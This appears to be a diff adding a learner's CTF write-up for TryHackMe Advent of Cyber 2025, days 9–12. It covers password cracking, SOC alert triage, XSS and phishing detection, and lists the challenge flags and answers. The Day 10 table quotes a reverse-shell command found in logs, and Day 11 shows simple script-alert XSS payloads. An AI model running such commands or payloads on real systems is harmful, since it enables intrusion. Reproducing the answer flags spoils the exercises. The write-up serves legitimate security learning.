@@ -1,0 +1,219 @@
+# 🛡️ TryHackMe – Advent of Cyber 2025
+
+---
+
+## Day 09 — Passwords: A Cracking Christmas 🔐
+
+*Learning how attackers crack password-protected files and how defenders detect it.*
+
+**Platform:** TryHackMe  
+**Duration:** 30 min  
+**Status:** Completed (100%)
+
+---
+
+### ❄️ 1. Challenge Overview
+
+**Focus:** Password Attacks & Encrypted Files  
+**Objective:** Recover passwords from encrypted PDF and ZIP files using dictionary and brute-force techniques.
+
+---
+
+### 🧠 2. Key Concepts
+
+- Dictionary attacks (rockyou.txt)
+- Brute-force and mask attacks
+- PDF and ZIP cracking
+- Offline attack detection
+- Endpoint and SOC telemetry
+
+---
+
+### 🧰 3. Tools Used
+
+- `pdfcrack`
+- `john`
+- `zip2john`
+- `hashcat`
+- `rockyou.txt`
+
+---
+
+### 🧾 4. Task Question Answers
+
+| Question                                  | Answer                              |
+|------------------------------------------|-------------------------------------|
+| Flag inside the encrypted PDF             | THM{Cr4ck1ng_PDFs_1s_34$y}           |
+| Flag inside the encrypted ZIP             | THM{Cr4ck1n6_z1p$_1s_34$yyyy}        |
+
+---
+
+### 🛡️ 5. Blue Team Takeaways
+
+- Offline cracking avoids account lockouts
+- Detect via process execution, GPU usage, and file reads
+- Monitor known tools and wordlists
+- Investigate high CPU/GPU utilization
+
+---
+
+✅ *Day 09 completed — understanding real-world password cracking and detection.*
+
+---
+
+## Day 10 — SOC Alert Triaging: Tinsel Triage 🚨
+
+*Investigating and correlating alerts using Microsoft Sentinel.*
+
+**Platform:** TryHackMe  
+**Duration:** 45 min  
+**Status:** Completed (100%)
+
+---
+
+### ❄️ 1. Challenge Overview
+
+**Focus:** SOC Operations & Alert Triage  
+**Objective:** Analyse security alerts, identify attack chains, and investigate logs using KQL.
+
+---
+
+### 🧠 2. Skills Practiced
+
+- Alert prioritisation
+- Incident correlation
+- Privilege escalation detection
+- KQL querying
+- Log analysis
+
+---
+
+### 🧾 3. Task 4 – Answers
+
+| Question                                                           | Answer |
+|-------------------------------------------------------------------|--------|
+| Entities affected by Polkit exploit alert                          | 10     |
+| Severity of Sudo Shadow Access alert                               | High   |
+| Accounts added to sudoers group                                    | 4      |
+
+---
+
+### 🧾 4. Task 5 – Answers
+
+| Question                                                           | Answer |
+|-------------------------------------------------------------------|--------|
+| Kernel module installed on websrv-01                               | malicious_mod.ko |
+| Unusual command run by ops user                                    | /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1 |
+| Source IP of first SSH login to storage-01                         | 172.16.0.12 |
+| External IP logged in as root to app-01                            | 203.0.113.45 |
+| User added to sudoers (besides backup user)                        | deploy |
+
+---
+
+### 🛡️ 5. Blue Team Lessons
+
+- Multiple alerts often represent one attack chain
+- Always correlate entities (host, user, IP)
+- High-severity alerts demand immediate action
+- Logs validate or dismiss alerts
+
+---
+
+✅ *Day 10 completed — practical SOC alert triaging skills.*
+
+---
+
+## Day 11 — XSS: Merry XSSMas 🎄
+
+*Identifying and exploiting Cross-Site Scripting vulnerabilities.*
+
+**Platform:** TryHackMe  
+**Duration:** 30 min  
+**Status:** Completed (100%)
+
+---
+
+### ❄️ 1. Challenge Overview
+
+**Focus:** Web Application Security – XSS  
+**Objective:** Exploit reflected and stored XSS vulnerabilities.
+
+---
+
+### 🧠 2. XSS Types Covered
+
+- Reflected XSS
+- Stored XSS
+
+---
+
+### 🎯 3. Payloads Used
+
+**Reflected XSS**
+```html
+<script>alert('Reflected Meow Meow')</script>
+Stored XSS
+
+html
+Copy code
+<script>alert('Stored Meow Meow')</script>
+🧾 4. Task Question Answers
+Question	Answer
+XSS type requiring backend persistence	Stored
+Reflected XSS flag	THM{Evil_Bunny}
+Stored XSS flag	THM{Evil_Stored_Egg}
+
+🛡️ 5. Defensive Measures
+Sanitize and encode inputs
+
+Avoid innerHTML
+
+Use secure cookie attributes
+
+Validate all user-supplied data
+
+✅ Day 11 completed — mastering XSS attacks and prevention.
+
+Day 12 — Phishing: Phishmas Greetings 🎣
+Detecting phishing emails and social engineering tactics.
+
+Platform: TryHackMe
+Duration: 30 min
+Status: Completed (100%)
+
+❄️ 1. Challenge Overview
+Focus: Email Security & Phishing
+Objective: Classify emails as phishing or spam and identify attack techniques.
+
+🧠 2. Techniques Identified
+Impersonation
+
+Spoofing (SPF/DKIM/DMARC failures)
+
+Social engineering
+
+Typosquatting & punycode
+
+Malicious attachments
+
+Fake login portals
+
+🧾 3. Task Question Answers
+Email	Flag
+1st	THM{yougotnumber1-keep-it-going}
+2nd	THM{nmumber2-was-not-tha-thard!}
+3rd	THM{Impersonation-is-areal-thing-keepIt}
+4th	THM{Get-back-SOC-mas!!}
+5th	THM{It-was-just-a-sp4m!!}
+6th	THM{number6-is-the-last-one!-DX!}
+
+🛡️ 4. Blue Team Takeaways
+Always inspect headers and sender domains
+
+Watch for urgency and unusual requests
+
+Legitimate services can still host malicious lures
+
+Human awareness remains critical
+
+✅ Day 12 completed — strengthening phishing detection skills.
